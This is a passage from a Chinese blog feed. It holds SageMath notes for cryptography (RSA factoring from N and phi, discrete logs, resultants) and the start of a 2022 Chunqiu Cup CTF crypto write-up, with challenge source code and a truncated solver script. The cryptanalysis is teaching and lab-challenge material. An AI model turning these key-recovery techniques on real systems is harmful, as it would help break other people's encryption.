</p><p>求解XA=0，线性相关的行向量</p></li><li><p><code>A.right_kernel()</code><br>解AX=0，线性相关的行向量</p></li><li><p><strong>A.LLL()</strong></p><p>LLL算法求<strong>最短正交基</strong></p></li><li><p><code>A.multiplicative_order()</code></p><p><strong>乘法阶</strong></p></li></ul></li><li><p>特别的</p><ul><li><p><code>zero_matrix(2,3)</code></p><p>创建（2*3）零矩阵</p></li><li><p><code>identity_matrix(2,3)</code></p><p>创建（2*3）单位阵</p></li><li><p><code>block_matrix(QQ,[[Matrix_A,Matrix_B],[matrix(C),matrix(D)]])</code></p><p>矩阵拼接</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">A = matrix(ZZ, <span class="comment">[<span class="comment">[1,1]</span>,<span class="comment">[0,4]</span>]</span>)</span><br><span class="line">b = <span class="comment">[<span class="comment">[2,2]</span>,<span class="comment">[3,3]</span>]</span></span><br><span class="line">n = 2</span><br><span class="line"></span><br><span class="line">block_matrix(QQ,<span class="comment">[<span class="comment">[A,zero_matrix(n,2)]</span>,<span class="comment">[matrix(b),matrix(<span class="comment">[<span class="comment">[4,4]</span>,<span class="comment">[5,5]</span>]</span>)]</span>]</span>)</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"><span class="subst">[1 1|0 0]</span></span></span><br><span class="line"><span class="string"><span class="subst">[0 4|0 0]</span></span></span><br><span class="line"><span class="string"><span class="subst">[---+---]</span></span></span><br><span class="line"><span class="string"><span class="subst">[2 2|4 4]</span></span></span><br><span class="line"><span class="string"><span class="subst">[3 3|5 5]</span></span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="困惑"><a href="#困惑" class="headerlink" title="困惑"></a>困惑</h4><ul><li><p>关于$matrix()<em>vector()$, *</em>sage是会自动变向量为列向量或行向量来使得乘法可算吗？**</p><p>查阅中文文档后，证实Sage为了让乘法合理化，会尽可能调整向量是行或列向量。</p><p>而在使用之前，向量的状态是混沌的。</p></li></ul><h3 id="求解方程"><a href="#求解方程" class="headerlink" title="求解方程"></a>求解方程</h3><h4 id="普通方程"><a href="#普通方程" class="headerlink" title="普通方程"></a>普通方程</h4><p>$\left\{\begin{aligned}x+y&amp;=10\\xy&amp;=21\end{aligned}\right.$</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var(<span class="string">&#x27;x y&#x27;</span>)  # 申明变量</span><br><span class="line">solve([x+<span class="attribute">y</span>==10, x*<span class="attribute">y</span>==21], [x,y])  # 求解</span><br></pre></td></tr></table></figure><h4 id="线性方程组"><a href="#线性方程组" class="headerlink" title="线性方程组"></a><strong>线性方程组</strong></h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">A</span> = Matrix([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>]]) </span><br><span class="line"><span class="attribute">Y</span> = vector([<span class="number">0</span>,-<span class="number">4</span>,-<span class="number">1</span>]) </span><br><span class="line"><span class="attribute">X</span> = A.solve_right(Y)</span><br><span class="line"><span class="comment">#或</span></span><br><span class="line"><span class="attribute">A</span> \ Y</span><br><span class="line"><span class="comment">#反斜杠 \ 可以代替 solve_right; 用 A \ Y 代替 A.solve right(Y).</span></span><br></pre></td></tr></table></figure><ul><li>给一个记忆点，斜杠的<strong>下端在哪边</strong>，<strong>未知量x就在哪边</strong></li></ul><h4 id="RSA相关方程"><a href="#RSA相关方程" class="headerlink" title="RSA相关方程"></a>RSA相关方程</h4><p>$\left\{\begin{aligned}N&amp;=pq\\ \phi &amp;= (p-1)(q-1)\end{aligned}\right.$</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">P.<span class="operator">&lt;</span>p, q<span class="operator">&gt;</span> <span class="operator">=</span> PolynomialRing(ZZ)</span><br><span class="line">def solve(f1, f2):</span><br><span class="line">g <span class="operator">=</span> f1.resultant(f2, q)</span><br><span class="line">roots <span class="operator">=</span> g.univariate_polynomial().roots()</span><br><span class="line">if len(roots) <span class="operator">=</span><span class="operator">=</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">p_ <span class="operator">=</span> <span class="built_in">abs</span>(roots[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">q_ <span class="operator">=</span> <span class="built_in">abs</span>(roots[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">min</span>(p_, q_), <span class="built_in">max</span>(p_, q_))</span><br><span class="line"></span><br><span class="line">N <span class="operator">=</span> </span><br><span class="line">phi <span class="operator">=</span> </span><br><span class="line">f1 <span class="operator">=</span> (N <span class="operator">+</span> <span class="number">1</span>) <span class="operator">-</span> phi <span class="operator">-</span> p <span class="operator">-</span> q</span><br><span class="line">f2 <span class="operator">=</span> N <span class="operator">-</span> p<span class="operator">*</span>q</span><br><span class="line">p, q <span class="operator">=</span> solve(f1, f2)</span><br><span class="line">(p, q)</span><br></pre></td></tr></table></figure><ul><li><a href="[https://jayxv.github.io/2020/05/20/sage%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4](https://jayxv.github.io/2020/05/20/sage常用命令/)">参考</a></li></ul><h3 id="CRT-中国剩余定理"><a href="#CRT-中国剩余定理" class="headerlink" title="CRT(中国剩余定理)"></a>CRT(中国剩余定理)</h3><p>$\left\{\begin{aligned}x&amp;≡2 (mod3)\\x&amp;≡3(mod5)\\x&amp;≡2(mod7)\end{aligned}\right.$</p><p>Sage内置CRT函数<code>crt([2,3,2], [3,5,7])</code></p><p>但<strong>没有</strong>模不互素的<strong>扩展中国定理excrt</strong>（具体原理、代码可见我的博客中<strong>Crypto常见算法</strong>一文）</p><h3 id="离散对数"><a href="#离散对数" class="headerlink" title="离散对数"></a>离散对数</h3><p>$a^x ≡ b (\mod n )$</p><ul><li><p>n为合数</p><p>利用Pohlig-Hellman算法（后续再补充原理学习）</p><p><code>x = discrete_log(mod(b,n),mod(a,n))</code></p><p>??? n是质数幂也解出来了</p></li><li><p>n为质数或质数幂</p><p>线性筛Index Calculus方法（不了解）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">R = Integers(<span class="number">99</span>)</span><br><span class="line">a = R(<span class="number">4</span>)</span><br><span class="line">b = a^<span class="number">9</span></span><br><span class="line">b.log(a)</span><br><span class="line"><span class="comment"># 9 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">x = <span class="built_in">int</span>(pari(<span class="string">f&quot;znlog(<span class="subst">&#123;<span class="built_in">int</span>(b)&#125;</span>,Mod(<span class="subst">&#123;<span class="built_in">int</span>(a)&#125;</span>,<span class="subst">&#123;<span class="built_in">int</span>(n)&#125;</span>))&quot;</span>))</span><br><span class="line">x = gp.znlog(b, gp.Mod(a, n))</span><br></pre></td></tr></table></figure></li></ul><h3 id="椭圆曲线"><a href="#椭圆曲线" class="headerlink" title="椭圆曲线"></a>椭圆曲线</h3><p>$y^2 =x^3 + ax + b$</p><ul><li><p><code>F = GF(7)</code></p><p><a href="https://www.cnblogs.com/Colin-Cai/p/9397448.html">素数域</a></p></li><li><p><code>F.order()</code></p><p>素数域的阶</p></li><li><p><code>E = EllipticCurve(F,[0,0,0,2,3])</code></p><p>定义椭圆曲线$F_7(2,3)$</p></li><li><p><code>G = E.gens()[0]</code></p><p>基点坐标</p></li><li><p><code>q = E.order()</code><br>阶</p></li><li><p><code>allPoints = E.points()</code><br>所有的点</p></li><li><p><code>P = E(2,1)</code><br>创建点</p></li><li><p><code>P.xy()</code><br>点的xy坐标</p></li></ul><h3 id="结式¶"><a href="#结式¶" class="headerlink" title="结式¶"></a>结式¶</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> sage.matrix.matrix<span class="number">2</span> import Matrix</span><br><span class="line"><span class="attribute">def</span> resultant(f<span class="number">1</span>, f<span class="number">2</span>, var):</span><br><span class="line">    <span class="attribute">return</span> Matrix.determinant(f<span class="number">1</span>.sylvester_matrix(f<span class="number">2</span>, var))</span><br><span class="line"></span><br><span class="line"><span class="attribute">n</span> = </span><br><span class="line"><span class="attribute">P</span>.&lt;k,t<span class="number">2</span>,t<span class="number">3</span>,d&gt; = PolynomialRing(Integers(n))</span><br><span class="line"><span class="attribute">f1</span> = s<span class="number">1</span>*k - h - r*d</span><br><span class="line"><span class="attribute">f2</span> = s<span class="number">2</span>*(k+t<span class="number">2</span>) - h - r*d</span><br><span class="line"><span class="attribute">f3</span> = s<span class="number">3</span>*(k+t<span class="number">3</span>) - h - r*d</span><br><span class="line"><span class="attribute">h1</span> = resultant(f<span class="number">1</span>, f<span class="number">2</span>, d)</span><br><span class="line"><span class="attribute">h2</span> = resultant(f<span class="number">1</span>, f<span class="number">3</span>, d)</span><br><span class="line"><span class="attribute">g1</span> = resultant(h<span class="number">1</span>, h<span class="number">2</span>, k)</span><br></pre></td></tr></table></figure><h4 id="结式求解"><a href="#结式求解" class="headerlink" title="结式求解"></a>结式求解</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f = f1.resultant(f2, xp)  <span class="comment"># 消xp</span></span><br><span class="line">PR.&lt;p&gt;=PolynomialRing(ZZ)</span><br><span class="line">f = f(p, p)  <span class="comment"># 转换为单元多项式</span></span><br><span class="line">p = f.roots()[0][0]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年春秋杯网络安全联赛春季赛·Crypto WP</title>
      <link href="/2022/05/09/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9B/"/>
      <url>/2022/05/09/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E6%98%A5%E5%AD%A3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2022年春秋杯网络安全联赛春季赛·Crypto"><a href="#2022年春秋杯网络安全联赛春季赛·Crypto" class="headerlink" title="2022年春秋杯网络安全联赛春季赛·Crypto"></a>2022年春秋杯网络安全联赛春季赛·Crypto</h1><blockquote><p>勇者山峰与传说殿堂都看了题</p></blockquote><p>九点开始守着看的是勇者山峰</p><p>当时只有了一道300分的题</p><h2 id="notKnapsack"><a href="#notKnapsack" class="headerlink" title="notKnapsack"></a><strong>notKnapsack</strong></h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> FLAG.startswith(<span class="string">b&#x27;flag&#123;&#x27;</span>) <span class="keyword">and</span> FLAG.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">q = <span class="number">210767327475911131359308665806489575328083</span></span><br><span class="line"></span><br><span class="line">flag_bin = <span class="built_in">bin</span>(bytes_to_long(FLAG[<span class="number">5</span>:-<span class="number">1</span>]))[<span class="number">2</span>:]</span><br><span class="line">l = <span class="built_in">len</span>(flag_bin)</span><br><span class="line"></span><br><span class="line">n = random.randint(l, <span class="number">2</span>*l)</span><br><span class="line">cipher = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    r = [random.randint(<span class="number">2</span>, q-<span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">    s = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        s = s * r[i] ** <span class="built_in">int</span>(flag_bin[i]) % q</span><br><span class="line">    cipher.append([r, s])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">str</span>(cipher))</span><br></pre></td></tr></table></figure><ul><li><a href="http://cun.harry0597.com/CTF/output.txt">output.txt</a></li></ul><p>对output简单处理了下，然后分析加密代码，可知这是累积的特殊背包问题，搜寻无果，z3不好用。</p><p>仔细看题目，说不是背包，或许另有妙计。</p><p>时间已过去两个半小时。</p><p>十一点半，刷新发现又上了一道500分题</p><h2 id="Train"><a href="#Train" class="headerlink" title="Train"></a>Train</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">banner = <span class="string">br&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> .oooooo..o                             oooo  oooo  ooooooooooooo                     o8o              </span></span><br><span class="line"><span class="string">d8P&#x27;    `Y8                             `888  `888  8&#x27;   888   `8                     `&quot;&#x27;              </span></span><br><span class="line"><span class="string">Y88bo.      ooo. .oo.  .oo.    .oooo.    888   888       888      oooo d8b  .oooo.   oooo  ooo. .oo.   </span></span><br><span class="line"><span class="string"> `&quot;Y8888o.  `888P&quot;Y88bP&quot;Y88b  `P  )88b   888   888       888      `888&quot;&quot;8P `P  )88b  `888  `888P&quot;Y88b  </span></span><br><span class="line"><span class="string">     `&quot;Y88b  888   888   888   .oP&quot;888   888   888       888       888      .oP&quot;888   888   888   888  </span></span><br><span class="line"><span class="string">oo     .d8P  888   888   888  d8(  888   888   888       888       888     d8(  888   888   888   888  </span></span><br><span class="line"><span class="string">8&quot;&quot;88888P&#x27;  o888o o888o o888o `Y888&quot;&quot;8o o888o o888o     o888o     d888b    `Y888&quot;&quot;8o o888o o888o o888o </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">n0 = <span class="number">30798082519452208630254982405300548841337042015746308462162479889627080155514391987610153873334549377764946092629701</span></span><br><span class="line">g = <span class="number">64146569863628228208271069055817252751116365290967978172021890038925428672043</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TrainHash</span>(<span class="params">msg</span>):</span></span><br><span class="line">    n = n0</span><br><span class="line">    msg = <span class="built_in">map</span>(<span class="built_in">ord</span>,msg)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> msg :</span><br><span class="line">        n = g * (n+i)</span><br><span class="line">        n = n &amp; (<span class="number">1</span>&lt;&lt;<span class="number">383</span>)</span><br><span class="line">    <span class="keyword">return</span> n - <span class="number">0xf5e33dabb114514</span></span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line">MENU = <span class="string">br&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;OPTION&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;SERVER &lt;INPUT&gt;: &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        proof = (<span class="string">&#x27;&#x27;</span>.join([random.choice(table)<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])).encode()</span><br><span class="line">        sha = sha256(proof).hexdigest().encode()</span><br><span class="line">        self.send(<span class="string">b&quot;[+] sha256(XXXX+&quot;</span> + proof[<span class="number">4</span>:] + <span class="string">b&quot;) == &quot;</span> + sha )</span><br><span class="line">        XXXX = self.recv(prompt = <span class="string">b&#x27;[+] Plz Tell Me XXXX :&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(XXXX) != <span class="number">4</span> <span class="keyword">or</span> sha256(XXXX + proof[<span class="number">4</span>:]).hexdigest().encode() != sha:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> sha.decode()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">30</span>)</span><br><span class="line">        FirstBlockHash = self.proof_of_work()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> FirstBlockHash:</span><br><span class="line">            self.request.close()</span><br><span class="line">        self.send(banner)</span><br><span class="line">        self.send(<span class="string">b&quot;\nPlease give me 2 strings that are same when are hashed  =.=  &quot;</span>)</span><br><span class="line">        string1 = self.recv().decode()</span><br><span class="line">        string2 = self.recv().decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> TrainHash(string1) == TrainHash(string2):</span><br><span class="line">            self.send(<span class="string">b&#x27;\nJust do it!~ You can do more!&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> string2.encode()[-<span class="number">50</span>:] == string1.encode()[-<span class="number">50</span>:]:</span><br><span class="line">                self.send(flag)</span><br><span class="line">        self.send(<span class="string">b&quot;\nConnection has been closed  =.=  &quot;</span>)</span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span>(<span class="params">socketserver.ThreadingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="params">socketserver.ForkingMixIn, socketserver.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10012</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HOST:POST &quot;</span> + HOST+<span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(PORT))</span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>简单审计代码，不了解的hash方式。</p><p>无所谓，朴素地想着先写py脚本连上靶机互动一下</p><p>结果，发了两个字符串<code>flag</code>，直接送给我了flag🤔</p><p>回去看代码，发现确实没限定string长度，不好的题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;写自己的HOST&#x27;</span>  <span class="comment"># str</span></span><br><span class="line">PORT = 自己的端口  <span class="comment"># int</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line">a = <span class="built_in">str</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(a.strip(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">sha_key = <span class="string">&#x27;&#x27;</span>.join(data.split(<span class="string">&#x27;)&#x27;</span>)[<span class="number">0</span>]).split(<span class="string">&#x27;+&#x27;</span>)[-<span class="number">1</span>]  <span class="comment"># like: dygRhRVGRA146H43</span></span><br><span class="line"><span class="built_in">print</span>(sha_key)</span><br><span class="line">sha_data = data.split(<span class="string">&#x27;== &#x27;</span>)[-<span class="number">1</span>][:-<span class="number">3</span>]  <span class="comment"># like: d06a5396ad875acdf0796cc5b0c083170e38728847085cfd99dadaeda71a3d17</span></span><br><span class="line"><span class="built_in">print</span>(sha_data)</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一关 sha256</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decry</span>(<span class="params">data</span>):</span></span><br><span class="line">    s = hashlib.sha256()  <span class="comment"># Get the hash algorithm.</span></span><br><span class="line">    s.update(data.encode())  <span class="comment"># Hash the data.</span></span><br><span class="line">    b = s.hexdigest()  <span class="comment"># Get he hash value.</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">list1 = [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;J&quot;</span>,</span><br><span class="line">         <span class="string">&quot;K&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span 